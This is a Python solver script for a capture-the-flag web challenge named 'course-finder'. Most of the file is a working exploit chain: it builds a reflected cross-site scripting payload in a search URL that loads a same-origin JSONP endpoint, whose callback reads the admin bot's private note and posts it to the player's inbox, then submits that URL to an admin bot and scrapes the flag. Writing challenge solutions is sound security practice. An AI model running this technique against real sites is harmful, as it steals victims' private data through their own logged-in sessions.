#!/usr/bin/env python3
"""Course Finder solver: hand the assistant a link, read her note in the inbox."""

from __future__ import annotations

import argparse
import http.cookiejar
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

STUDENT_USERNAME = "student"

CHALLENGE_ID = "course-finder"

FLAG = re.compile(r"ingehack\{[^}\r\n]+\}")

def build_callback(claim: str) -> str:
    """Runs inside the assistant's browser and files her note under the claim."""
    return (
        "fetch('/api/me/note')"
        ".then(r=>r.text())"
        ".then(t=>fetch('/api/inbox',{method:'POST',"
        "headers:{'Content-Type':'application/x-www-form-urlencoded'},"
        "body:'to=" + claim + "&body='+encodeURIComponent(t)}))//"
    )


class SolverError(RuntimeError):
    """The intended path did not produce a flag."""


def build_target_url(base_url: str, claim: str) -> str:
    """The search URL whose query carries a same-origin script into her page."""
    callback = urllib.parse.quote(build_callback(claim), safe="")
    payload = f'<script src="/api/jsonp?cb={callback}"></script>'
    return base_url + "/search?q=" + urllib.parse.quote(payload, safe="")


def sign_in(base_url: str) -> urllib.request.OpenerDirector:
    """Sign in as the player and return the opener that keeps the session cookie."""
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    try:
        with opener.open(base_url + "/login", timeout=10) as response:
            page = response.read().decode("utf-8", "replace")
        match = re.search(r'data-pin-for="student">([^<]+)</code>', page)
        if not match:
            raise SolverError("the login page did not carry the student pass")
        body = urllib.parse.urlencode(
            {"username": STUDENT_USERNAME, "password": match.group(1)}
        ).encode()
        opener.open(base_url + "/login", body, timeout=10)
        with opener.open(base_url + "/inbox", timeout=10) as response:
            if response.geturl().endswith("/login"):
                raise SolverError("signing in as the student did not create a session")
    except urllib.error.URLError as error:
        raise SolverError(f"cannot sign in at {base_url}: {error}") from error
    return opener


def read_inbox(
    opener: urllib.request.OpenerDirector,
    base_url: str,
    claim: str | None = None,
) -> tuple[str, str]:
    """Read the inbox and return its claim code and page."""
    path = "/inbox"
    if claim:
        path += "?claim=" + urllib.parse.quote(claim)
    try:
        with opener.open(base_url + path, timeout=10) as response:
            page = response.read().decode("utf-8", "replace")
    except urllib.error.URLError as error:
        raise SolverError(f"cannot read the inbox: {error}") from error
    match = re.search(r'data-claim="([0-9a-f]{8})"', page)
    if not match:
        raise SolverError("the inbox did not carry a claim code")
    return match.group(1), page


def prepare_with(
    opener: urllib.request.OpenerDirector,
    base_url: str,
    claim: str | None = None,
) -> str:
    claim, _ = read_inbox(opener, base_url, claim)
    return build_target_url(base_url, claim)


def run_admin_bot(
    platform_url: str,
    token: str,
    challenge_id: str,
    url: str,
    timeout: float = 90.0,
) -> None:
    """Submit the URL to the platform admin bot and wait for the visit to finish."""
    base = platform_url.rstrip("/")
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "ingehack-solver/1.0",
    }
    request = urllib.request.Request(
        f"{base}/api/v2/integrations/challs/{challenge_id}/admin-bot",
        data=json.dumps({"inputs": {"url": url}}).encode(),
        headers=headers,
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=20) as response:
            submitted = json.load(response)
    except urllib.error.HTTPError as error:
        detail = error.read().decode("utf-8", "replace")[:200]
        raise SolverError(f"the platform refused the job ({error.code}): {detail}") from error
    except urllib.error.URLError as error:
        raise SolverError(f"cannot reach the platform: {error}") from error
    if submitted.get("kind") != "goodAdminBotJobSubmitted":
        raise SolverError(f"the platform refused the job: {submitted.get('kind')}")
    job_id = submitted["data"]["jobId"]
    print(f"admin bot job {job_id} submitted", file=sys.stderr)

    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        status_request = urllib.request.Request(
            f"{base}/api/v2/integrations/challs/{challenge_id}/admin-bot/status",
            headers={
                "Authorization": f"Bearer {token}",
                "User-Agent": "ingehack-solver/1.0",
            },
        )
        try:
            with urllib.request.urlopen(status_request, timeout=20) as response:
                status = json.load(response)
        except urllib.error.URLError as error:
            raise SolverError(f"cannot read the job status: {error}") from error
        job = (status.get("data") or {}).get("job") or {}
        if job.get("id") == job_id:
            if job.get("status") == "completed":
                return
            if job.get("status") == "failed":
                raise SolverError("the admin bot job failed")
        time.sleep(3)
    raise SolverError("the admin bot did not finish in time")


def submit_with(
    opener: urllib.request.OpenerDirector,
    base_url: str,
    claim: str | None = None,
) -> None:
    _, page = read_inbox(opener, base_url, claim)
    match = FLAG.search(page)
    if not match:
        raise SolverError("the note is not in the inbox yet")
    print(match.group(0))


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", required=True)
    parser.add_argument("--stage", choices=("prepare", "submit", "all"))
    parser.add_argument(
        "--platform-url",
        help="platform base URL, needed for --stage all (for example https://ctf.ingeniums.club)",
    )
    parser.add_argument(
        "--token",
        help="player API token, needed for --stage all; the run-bot form uses the same account",
    )
    parser.add_argument("--challenge-id", default=CHALLENGE_ID)
    parser.add_argument(
        "--claim",
        help="claim code printed by --stage prepare, needed for a two-stage run",
    )
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    try:
        if args.stage == "prepare":
            opener = sign_in(base_url)
            claim, _ = read_inbox(opener, base_url, args.claim)
            print(prepare_with(opener, base_url, claim))
            print(f"claim: {claim}", file=sys.stderr)
        elif args.stage == "submit":
            if not args.claim:
                print(
                    "solver: --stage submit needs --claim from --stage prepare",
                    file=sys.stderr,
                )
                return 2
            opener = sign_in(base_url)
            submit_with(opener, base_url, args.claim)
        elif args.stage == "all":
            if not args.platform_url or not args.token:
                print(
                    "solver: --stage all needs --platform-url and --token",
                    file=sys.stderr,
                )
                return 2
            opener = sign_in(base_url)
            claim, _ = read_inbox(opener, base_url)
            print(f"claim: {claim}", file=sys.stderr)
            url = prepare_with(opener, base_url, claim)
            print(f"bot target: {url}", file=sys.stderr)
            run_admin_bot(args.platform_url, args.token, args.challenge_id, url)
            submit_with(opener, base_url, claim)
        else:
            print(
                "solver: pass --stage prepare, submit, or all",
                file=sys.stderr,
            )
            return 2
    except SolverError as error:
        print(f"solver: {error}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
